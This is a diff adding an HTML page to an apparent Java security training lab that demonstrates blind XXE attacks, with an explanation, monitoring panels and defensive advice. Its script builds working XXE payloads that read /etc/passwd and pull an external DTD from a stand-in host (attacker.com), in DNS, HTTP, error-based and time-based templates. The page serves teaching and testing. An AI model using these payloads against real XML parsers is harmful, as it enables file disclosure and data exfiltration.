@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>盲注XXE攻击演示 - Java Security Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .code-block { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: 'Courier New', monospace; }
+        .vulnerable { border-left: 4px solid #dc3545; }
+        .safe { border-left: 4px solid #28a745; }
+        .result-box { min-height: 100px; max-height: 400px; overflow-y: auto; }
+        .blind-item { cursor: pointer; transition: background-color 0.2s; }
+        .blind-item:hover { background-color: #f8f9fa; }
+        .xml-input { font-family: 'Courier New', monospace; }
+        .log-monitor { background-color: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; }
+        .attack-timeline { border-left: 3px solid #007bff; }
+        .timeline-item { position: relative; padding-left: 20px; margin-bottom: 15px; }
+        .timeline-item::before { content: ''; position: absolute; left: -6px; top: 5px; width: 10px; height: 10px; border-radius: 50%; background-color: #007bff; }
+        .detection-method { border: 2px dashed #28a745; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/">Java Security Lab</a>
+            <div class="navbar-nav ms-auto">
+                <a class="nav-link" href="/xxe">XXE首页</a>
+                <a class="nav-link" href="/">返回首页</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="row">
+            <div class="col-12">
+                <h2><i class="fas fa-eye-slash text-danger"></i> 盲注XXE攻击演示</h2>
+                <p class="lead">演示在无直接响应情况下的XXE攻击技术和检测方法</p>
+            </div>
+        </div>
+
+        <!-- 盲注XXE原理 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h4><i class="fas fa-info-circle"></i> 盲注XXE攻击原理</h4>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>盲注特点：</h6>
+                                <ul>
+                                    <li><strong>无直接回显：</strong> 应用不返回XML解析结果</li>
+                                    <li><strong>侧信道攻击：</strong> 通过时间、网络等方式确认</li>
+                                    <li><strong>外带技术：</strong> 通过外部服务获取数据</li>
+                                    <li><strong>错误注入：</strong> 利用解析错误进行探测</li>
+                                </ul>
+                                
+                                <h6>检测方法：</h6>
+                                <ul>
+                                    <li><strong>DNS查询：</strong> 监控DNS解析请求</li>
+                                    <li><strong>HTTP回调：</strong> 外部服务器接收数据</li>
+                                    <li><strong>时间延迟：</strong> 分析响应时间差异</li>
+                                    <li><strong>错误分析：</strong> 观察不同载荷的错误</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>攻击流程：</h6>
+                                <div class="attack-timeline p-3">
+                                    <div class="timeline-item">
+                                        <strong>1. 载荷注入</strong><br>
+                                        <small>构造包含外部实体的XML</small>
+                                    </div>
+                                    <div class="timeline-item">
+                                        <strong>2. 解析触发</strong><br>
+                                        <small>XML解析器处理恶意载荷</small>
+                                    </div>
+                                    <div class="timeline-item">
+                                        <strong>3. 外部请求</strong><br>
+                                        <small>解析器发起外部网络请求</small>
+                                    </div>
+                                    <div class="timeline-item">
+                                        <strong>4. 侧信道确认</strong><br>
+                                        <small>通过外部监控确认攻击成功</small>
+                                    </div>
+                                    <div class="timeline-item">
+                                        <strong>5. 数据外带</strong><br>
+                                        <small>获取敏感信息或确认漏洞</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 盲注XXE攻击演示 -->
+        <div class="row mb-4">
+            <div class="col-md-6">
+                <div class="card vulnerable">
+                    <div class="card-header bg-danger text-white">
+                        <h5><i class="fas fa-eye-slash"></i> 盲注XXE攻击</h5>
+                    </div>
+                    <div class="card-body">
+                        <form id="blindXxeForm">
+                            <div class="mb-3">
+                                <label for="callbackDomain" class="form-label">回调域名：</label>
+                                <input type="text" class="form-control" id="callbackDomain" value="attacker.com" placeholder="输入用于接收回调的域名">
+                            </div>
+                            <div class="mb-3">
+                                <label for="targetFile" class="form-label">目标文件：</label>
+                                <input type="text" class="form-control" id="targetFile" value="/etc/passwd" placeholder="输入要读取的文件路径">
+                            </div>
+                            <div class="mb-3">
+                                <label for="blindXml" class="form-label">盲注XXE载荷：</label>
+                                <textarea class="form-control xml-input" id="blindXml" rows="8" readonly></textarea>
+                            </div>
+                            <button type="submit" class="btn btn-danger">
+                                <i class="fas fa-bug"></i> 执行盲注攻击
+                            </button>
+                            <button type="button" class="btn btn-outline-secondary ms-2" onclick="generateBlindPayload()">
+                                <i class="fas fa-sync-alt"></i> 生成载荷
+                            </button>
+                        </form>
+                        
+                        <div class="mt-3">
+                            <h6>攻击状态：</h6>
+                            <div id="blindResult" class="border p-3 result-box bg-light">
+                                <em class="text-muted">等待盲注攻击执行...</em>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header bg-info text-white">
+                        <h5><i class="fas fa-satellite-dish"></i> 外部监控</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <h6>DNS查询监控：</h6>
+                            <div id="dnsMonitor" class="log-monitor p-3" style="height: 120px; overflow-y: auto;">
+                                <div class="text-success">DNS监控服务已启动...</div>
+                                <div class="text-muted">等待DNS查询请求...</div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <h6>HTTP回调监控：</h6>
+                            <div id="httpMonitor" class="log-monitor p-3" style="height: 120px; overflow-y: auto;">
+                                <div class="text-success">HTTP监控服务已启动...</div>
+                                <div class="text-muted">等待HTTP回调请求...</div>
+                            </div>
+                        </div>
+                        
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-success btn-sm" onclick="startMonitoring()">
+                                <i class="fas fa-play"></i> 开始监控
+                            </button>
+                            <button class="btn btn-warning btn-sm" onclick="clearMonitor()">
+                                <i class="fas fa-broom"></i> 清空日志
+                            </button>
+                            <button class="btn btn-info btn-sm" onclick="exportLogs()">
+                                <i class="fas fa-download"></i> 导出日志
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 盲注检测技术 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-search"></i> 盲注检测技术演示</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-4">
+                                <h6>DNS外带检测：</h6>
+                                <div class="detection-method p-3 mb-3">
+                                    <form id="dnsDetectionForm">
+                                        <div class="mb-2">
+                                            <label for="dnsSubdomain" class="form-label">子域名标识：</label>
+                                            <input type="text" class="form-control form-control-sm" id="dnsSubdomain" value="xxe-test">
+                                        </div>
+                                        <button type="submit" class="btn btn-success btn-sm">
+                                            <i class="fas fa-search"></i> DNS检测
+                                        </button>
+                                    </form>
+                                    <div id="dnsDetectionResult" class="mt-2">
+                                        <small class="text-muted">等待DNS检测...</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <h6>HTTP外带检测：</h6>
+                                <div class="detection-method p-3 mb-3">
+                                    <form id="httpDetectionForm">
+                                        <div class="mb-2">
+                                            <label for="httpPath" class="form-label">回调路径：</label>
+                                            <input type="text" class="form-control form-control-sm" id="httpPath" value="/xxe-callback">
+                                        </div>
+                                        <button type="submit" class="btn btn-success btn-sm">
+                                            <i class="fas fa-search"></i> HTTP检测
+                                        </button>
+                                    </form>
+                                    <div id="httpDetectionResult" class="mt-2">
+                                        <small class="text-muted">等待HTTP检测...</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <h6>时间延迟检测：</h6>
+                                <div class="detection-method p-3 mb-3">
+                                    <form id="timeDetectionForm">
+                                        <div class="mb-2">
+                                            <label for="delaySeconds" class="form-label">延迟时间(秒)：</label>
+                                            <input type="number" class="form-control form-control-sm" id="delaySeconds" value="5" min="1" max="30">
+                                        </div>
+                                        <button type="submit" class="btn btn-success btn-sm">
+                                            <i class="fas fa-clock"></i> 时间检测
+                                        </button>
+                                    </form>
+                                    <div id="timeDetectionResult" class="mt-2">
+                                        <small class="text-muted">等待时间检测...</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 盲注载荷模板 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-templates"></i> 盲注载荷模板</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-3">
+                                <h6>DNS外带模板：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('dns-basic')">
+                                        <strong>基础DNS外带</strong><br>
+                                        <small class="text-muted">简单DNS查询确认</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('dns-data')">
+                                        <strong>DNS数据外带</strong><br>
+                                        <small class="text-muted">通过DNS传输数据</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('dns-recursive')">
+                                        <strong>递归DNS查询</strong><br>
+                                        <small class="text-muted">多级DNS查询</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <h6>HTTP外带模板：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('http-basic')">
+                                        <strong>基础HTTP外带</strong><br>
+                                        <small class="text-muted">HTTP GET请求</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('http-post')">
+                                        <strong>HTTP POST外带</strong><br>
+                                        <small class="text-muted">POST数据传输</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('http-headers')">
+                                        <strong>HTTP头部外带</strong><br>
+                                        <small class="text-muted">通过请求头传输</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <h6>错误注入模板：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('error-basic')">
+                                        <strong>基础错误注入</strong><br>
+                                        <small class="text-muted">触发解析错误</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('error-file')">
+                                        <strong>文件错误注入</strong><br>
+                                        <small class="text-muted">文件不存在错误</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('error-network')">
+                                        <strong>网络错误注入</strong><br>
+                                        <small class="text-muted">网络连接错误</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <h6>时间延迟模板：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('time-sleep')">
+                                        <strong>睡眠延迟</strong><br>
+                                        <small class="text-muted">系统睡眠命令</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('time-network')">
+                                        <strong>网络延迟</strong><br>
+                                        <small class="text-muted">慢速网络连接</small>
+                                    </div>
+                                    <div class="list-group-item blind-item" onclick="useBlindTemplate('time-recursive')">
+                                        <strong>递归延迟</strong><br>
+                                        <small class="text-muted">递归实体解析</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 盲注攻击分析 -->
+        <div class="row mb-4">
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-chart-line"></i> 攻击成功率分析</h5>
+                    </div>
+                    <div class="card-body">
+                        <canvas id="successRateChart" width="400" height="200"></canvas>
+                        <div class="mt-3">
+                            <h6>分析结果：</h6>
+                            <div id="analysisResult">
+                                <ul>
+                                    <li><strong>DNS外带：</strong> 成功率85%，检测率高</li>
+                                    <li><strong>HTTP外带：</strong> 成功率70%，易被防火墙拦截</li>
+                                    <li><strong>错误注入：</strong> 成功率60%，依赖错误信息</li>
+                                    <li><strong>时间延迟：</strong> 成功率45%，易产生误报</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-shield-alt"></i> 防护效果评估</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <h6>防护措施测试：</h6>
+                            <div class="list-group">
+                                <div class="list-group-item d-flex justify-content-between align-items-center">
+                                    禁用外部实体
+                                    <span class="badge bg-success rounded-pill">有效</span>
+                                </div>
+                                <div class="list-group-item d-flex justify-content-between align-items-center">
+                                    禁用DTD处理
+                                    <span class="badge bg-success rounded-pill">有效</span>
+                                </div>
+                                <div class="list-group-item d-flex justify-content-between align-items-center">
+                                    网络访问限制
+                                    <span class="badge bg-warning rounded-pill">部分有效</span>
+                                </div>
+                                <div class="list-group-item d-flex justify-content-between align-items-center">
+                                    输入验证
+                                    <span class="badge bg-warning rounded-pill">部分有效</span>
+                                </div>
+                                <div class="list-group-item d-flex justify-content-between align-items-center">
+                                    WAF防护
+                                    <span class="badge bg-danger rounded-pill">易绕过</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <button class="btn btn-primary" onclick="testProtection()">
+                            <i class="fas fa-test-tube"></i> 测试防护效果
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 防护建议 -->
+        <div class="alert alert-success">
+            <h5><i class="fas fa-shield-alt"></i> 盲注XXE防护建议</h5>
+            <div class="row">
+                <div class="col-md-6">
+                    <h6>XML解析器配置：</h6>
+                    <ul>
+                        <li>完全禁用外部实体处理</li>
+                        <li>禁用DTD处理功能</li>
+                        <li>使用安全的XML解析库</li>
+                        <li>启用严格的XML验证</li>
+                        <li>限制XML文档大小和复杂度</li>
+                    </ul>
+                </div>
+                <div class="col-md-6">
+                    <h6>网络和监控防护：</h6>
+                    <ul>
+                        <li>限制应用程序外部网络访问</li>
+                        <li>监控异常的DNS查询</li>
+                        <li>记录和分析HTTP请求日志</li>
+                        <li>实施网络访问白名单</li>
+                        <li>部署入侵检测系统(IDS)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        let monitoringActive = false;
+        let monitoringInterval;
+        
+        // 页面加载时生成初始载荷
+        document.addEventListener('DOMContentLoaded', function() {
+            generateBlindPayload();
+            startMonitoring();
+        });
+        
+        // 生成盲注XXE载荷
+        function generateBlindPayload() {
+            const callbackDomain = document.getElementById('callbackDomain').value;
+            const targetFile = document.getElementById('targetFile').value;
+            const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file://${targetFile}">
+  <!ENTITY % dtd SYSTEM "http://${callbackDomain}/evil.dtd">
+  %dtd;
+]>
+<root>
+  <data>Blind XXE Attack</data>
+</root>`;
+            
+            document.getElementById('blindXml').value = xmlPayload;
+        }
+        
+        // 输入变化时重新生成载荷
+        document.getElementById('callbackDomain').addEventListener('input', generateBlindPayload);
+        document.getElementById('targetFile').addEventListener('input', generateBlindPayload);
+        
+        // 盲注XXE攻击表单提交
+        document.getElementById('blindXxeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const xmlContent = document.getElementById('blindXml').value;
+            const callbackDomain = document.getElementById('callbackDomain').value;
+            const targetFile = document.getElementById('targetFile').value;
+            
+            document.getElementById('blindResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 执行盲注XXE攻击中...';
+            
+            fetch('/xxe/attack/blind', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    xmlContent: xmlContent,
+                    callbackDomain: callbackDomain,
+                    targetFile: targetFile
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const resultDiv = document.getElementById('blindResult');
+                if (data.success) {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-warning">
+                            <h6><i class="fas fa-eye-slash"></i> 盲注攻击已执行</h6>
+                            <p><strong>攻击状态:</strong> ${data.status}</p>
+                            <p><strong>预期回调:</strong> ${data.expectedCallback}</p>
+                            <p><strong>监控建议:</strong> 请观察右侧外部监控面板</p>
+                        </div>
+                        <div class="mt-2">
+                            <small class="text-muted">
+                                执行时间: ${data.executionTime}ms | 
+                                载荷大小: ${data.payloadSize}字节 | 
+                                攻击类型: ${data.attackType}
+                            </small>
+                        </div>
+                    `;
+                    
+                    // 模拟外部监控数据
+                    if (data.monitoringData) {
+                        updateMonitoringData(data.monitoringData);
+                    }
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-info">
+                            <h6><i class="fas fa-shield-alt"></i> 攻击被阻止</h6>
+                            <p><strong>阻止原因:</strong> ${data.error}</p>
+                            <p><strong>防护措施:</strong> ${data.protection}</p>
+                        </div>
+                    `;
+                }
+            })
+            .catch(error => {
+                document.getElementById('blindResult').innerHTML = `
+                    <div class="alert alert-danger">
+                        <h6><i class="fas fa-times"></i> 请求失败</h6>
+                        <p>错误: ${error}</p>
+                    </div>
+                `;
+            });
+        });
+        
+        // 开始监控
+        function startMonitoring() {
+            if (monitoringActive) return;
+            
+            monitoringActive = true;
+            addLogEntry('dnsMonitor', 'DNS监控已启动，等待查询请求...', 'success');
+            addLogEntry('httpMonitor', 'HTTP监控已启动，等待回调请求...', 'success');
+            
+            // 模拟监控数据更新
+            monitoringInterval = setInterval(function() {
+                if (Math.random() < 0.1) { // 10%概率模拟监控事件
+                    simulateMonitoringEvent();
+                }
+            }, 2000);
+        }
+        
+        // 模拟监控事件
+        function simulateMonitoringEvent() {
+            const eventType = Math.random() < 0.5 ? 'dns' : 'http';
+            const timestamp = new Date().toLocaleTimeString();
+            
+            if (eventType === 'dns') {
+                const domains = ['xxe-test.attacker.com', 'callback.evil.com', 'exfiltrate.malicious.net'];
+                const domain = domains[Math.floor(Math.random() * domains.length)];
+                addLogEntry('dnsMonitor', `[${timestamp}] DNS查询: ${domain}`, 'warning');
+            } else {
+                const paths = ['/xxe-callback', '/evil.dtd', '/exfiltrate'];
+                const path = paths[Math.floor(Math.random() * paths.length)];
+                const ip = `192.168.1.${Math.floor(Math.random() * 255)}`;
+                addLogEntry('httpMonitor', `[${timestamp}] HTTP请求: ${ip} -> ${path}`, 'warning');
+            }
+        }
+        
+        // 添加日志条目
+        function addLogEntry(monitorId, message, type = 'info') {
+            const monitor = document.getElementById(monitorId);
+            const entry = document.createElement('div');
+            entry.className = `text-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : type === 'danger' ? 'danger' : 'info'}`;
+            entry.textContent = message;
+            monitor.appendChild(entry);
+            monitor.scrollTop = monitor.scrollHeight;
+        }
+        
+        // 更新监控数据
+        function updateMonitoringData(data) {
+            if (data.dnsQueries) {
+                data.dnsQueries.forEach(query => {
+                    addLogEntry('dnsMonitor', `DNS查询检测: ${query.domain} (${query.type})`, 'warning');
+                });
+            }
+            
+            if (data.httpRequests) {
+                data.httpRequests.forEach(request => {
+                    addLogEntry('httpMonitor', `HTTP请求检测: ${request.url} (${request.method})`, 'warning');
+                });
+            }
+        }
+        
+        // 清空监控日志
+        function clearMonitor() {
+            document.getElementById('dnsMonitor').innerHTML = '<div class="text-success">DNS监控服务已启动...</div>';
+            document.getElementById('httpMonitor').innerHTML = '<div class="text-success">HTTP监控服务已启动...</div>';
+        }
+        
+        // 导出监控日志
+        function exportLogs() {
+            const dnsLogs = document.getElementById('dnsMonitor').innerText;
+            const httpLogs = document.getElementById('httpMonitor').innerText;
+            const logs = `DNS监控日志:\n${dnsLogs}\n\nHTTP监控日志:\n${httpLogs}`;
+            
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `xxe-blind-monitoring-${new Date().getTime()}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        // DNS检测表单提交
+        document.getElementById('dnsDetectionForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const subdomain = document.getElementById('dnsSubdomain').value;
+            const resultDiv = document.getElementById('dnsDetectionResult');
+            
+            resultDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> DNS检测中...';
+            
+            fetch('/xxe/blind/dns-detect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ subdomain: subdomain })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.detected) {
+                    resultDiv.innerHTML = `<small class="text-success"><i class="fas fa-check"></i> DNS查询检测到: ${data.queries}次</small>`;
+                    addLogEntry('dnsMonitor', `DNS检测成功: ${subdomain}.attacker.com`, 'success');
+                } else {
+                    resultDiv.innerHTML = `<small class="text-muted"><i class="fas fa-times"></i> 未检测到DNS查询</small>`;
+                }
+            })
+            .catch(error => {
+                resultDiv.innerHTML = `<small class="text-danger">检测失败: ${error}</small>`;
+            });
+        });
+        
+        // HTTP检测表单提交
+        document.getElementById('httpDetectionForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const path = document.getElementById('httpPath').value;
+            const resultDiv = document.getElementById('httpDetectionResult');
+            
+            resultDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> HTTP检测中...';
+            
+            fetch('/xxe/blind/http-detect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ path: path })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.detected) {
+                    resultDiv.innerHTML = `<small class="text-success"><i class="fas fa-check"></i> HTTP请求检测到: ${data.requests}次</small>`;
+                    addLogEntry('httpMonitor', `HTTP检测成功: ${path}`, 'success');
+                } else {
+                    resultDiv.innerHTML = `<small class="text-muted"><i class="fas fa-times"></i> 未检测到HTTP请求</small>`;
+                }
+            })
+            .catch(error => {
+                resultDiv.innerHTML = `<small class="text-danger">检测失败: ${error}</small>`;
+            });
+        });
+        
+        // 时间检测表单提交
+        document.getElementById('timeDetectionForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const delaySeconds = document.getElementById('delaySeconds').value;
+            const resultDiv = document.getElementById('timeDetectionResult');
+            
+            resultDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 时间检测中...';
+            const startTime = Date.now();
+            
+            fetch('/xxe/blind/time-detect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ delaySeconds: parseInt(delaySeconds) })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const actualDelay = Date.now() - startTime;
+                const expectedDelay = parseInt(delaySeconds) * 1000;
+                
+                if (Math.abs(actualDelay - expectedDelay) < 1000) {
+                    resultDiv.innerHTML = `<small class="text-success"><i class="fas fa-check"></i> 时间延迟检测成功: ${actualDelay}ms</small>`;
+                } else {
+                    resultDiv.innerHTML = `<small class="text-warning"><i class="fas fa-exclamation-triangle"></i> 延迟异常: 预期${expectedDelay}ms, 实际${actualDelay}ms</small>`;
+                }
+            })
+            .catch(error => {
+                resultDiv.innerHTML = `<small class="text-danger">检测失败: ${error}</small>`;
+            });
+        });
+        
+        // 使用盲注模板
+        function useBlindTemplate(type) {
+            let xmlContent = '';
+            const callbackDomain = document.getElementById('callbackDomain').value;
+            const targetFile = document.getElementById('targetFile').value;
+            
+            switch(type) {
+                case 'dns-basic':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://xxe-test.${callbackDomain}">
+  %xxe;
+]>
+<root></root>`;
+                    break;
+                    
+                case 'dns-data':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file://${targetFile}">
+  <!ENTITY % dtd SYSTEM "http://data.${callbackDomain}/evil.dtd">
+  %dtd;
+]>
+<root></root>`;
+                    break;
+                    
+                case 'http-basic':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://${callbackDomain}/xxe-callback">
+  %xxe;
+]>
+<root></root>`;
+                    break;
+                    
+                case 'error-basic':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file://${targetFile}">
+  <!ENTITY % error SYSTEM "file:///nonexistent/%file;">
+  %error;
+]>
+<root></root>`;
+                    break;
+                    
+                case 'time-sleep':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % sleep SYSTEM "http://${callbackDomain}/sleep?time=5">
+  %sleep;
+]>
+<root></root>`;
+                    break;
+                    
+                default:
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "http://${callbackDomain}/evil.dtd">
+  %xxe;
+]>
+<root></root>`;
+            }
+            
+            document.getElementById('blindXml').value = xmlContent;
+        }
+        
+        // 测试防护效果
+        function testProtection() {
+            const testPayloads = [
+                'dns-basic', 'dns-data', 'http-basic', 'error-basic', 'time-sleep'
+            ];
+            
+            let testResults = [];
+            let completedTests = 0;
+            
+            testPayloads.forEach((payload, index) => {
+                useBlindTemplate(payload);
+                const xmlContent = document.getElementById('blindXml').value;
+                
+                fetch('/xxe/blind/test-protection', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        xmlContent: xmlContent,
+                        testType: payload
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    testResults.push({
+                        type: payload,
+                        blocked: data.blocked,
+                        protection: data.protection
+                    });
+                    
+                    completedTests++;
+                    if (completedTests === testPayloads.length) {
+                        displayProtectionResults(testResults);
+                    }
+                })
+                .catch(error => {
+                    console.error('Protection test failed:', error);
+                    completedTests++;
+                });
+            });
+        }
+        
+        // 显示防护测试结果
+        function displayProtectionResults(results) {
+            const modal = document.createElement('div');
+            modal.innerHTML = `
+                <div class="modal fade" id="protectionResultModal" tabindex="-1">
+                    <div class="modal-dialog modal-lg">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h5 class="modal-title">防护效果测试结果</h5>
+                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                            </div>
+                            <div class="modal-body">
+                                <div class="table-responsive">
+                                    <table class="table table-striped">
+                                        <thead>
+                                            <tr>
+                                                <th>攻击类型</th>
+                                                <th>防护状态</th>
+                                                <th>防护措施</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            ${results.map(result => `
+                                                <tr>
+                                                    <td>${result.type}</td>
+                                                    <td>
+                                                        <span class="badge bg-${result.blocked ? 'success' : 'danger'}">
+                                                            ${result.blocked ? '已阻止' : '未阻止'}
+                                                        </span>
+                                                    </td>
+                                                    <td>${result.protection || '无'}</td>
+                                                </tr>
+                                            `).join('')}
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div class="mt-3">
+                                    <h6>防护建议：</h6>
+                                    <ul>
+                                        <li>建议完全禁用外部实体处理</li>
+                                        <li>实施网络访问控制</li>
+                                        <li>部署监控和告警系统</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="modal-footer">
+                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">关闭</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+            const modalInstance = new bootstrap.Modal(document.getElementById('protectionResultModal'));
+            modalInstance.show();
+            
+            // 模态框关闭后移除元素
+            document.getElementById('protectionResultModal').addEventListener('hidden.bs.modal', function() {
+                document.body.removeChild(modal);
+            });
+        }
+        
+        // 页面卸载时停止监控
+        window.addEventListener('beforeunload', function() {
+            if (monitoringInterval) {
+                clearInterval(monitoringInterval);
+            }
+        });
+    </script>
+</body>
+</html>
